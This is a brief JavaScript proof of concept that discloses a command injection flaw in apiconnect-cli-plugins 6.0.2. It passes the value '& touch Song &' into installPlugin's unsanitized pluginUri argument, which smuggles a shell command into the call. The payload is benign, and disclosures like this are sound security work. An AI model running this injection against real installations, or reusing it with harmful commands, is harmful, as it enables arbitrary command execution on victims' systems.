/**
 * apiconnect-cli-plugins@6.0.2 is vulnerable to command injection.
 * the injection point is located in line 181 of file "lib/plugin-loader.js", in 
 * function installPlugin(pluginUri, registryUri).
 * this file is required by the index file of this package.
* the argument "pluginUri" can be controlled by users without any sanitization.
*/


var root = require("apiconnect-cli-plugins");
var payload = "& touch Song &";
root.pluginLoader.installPlugin(payload,"");
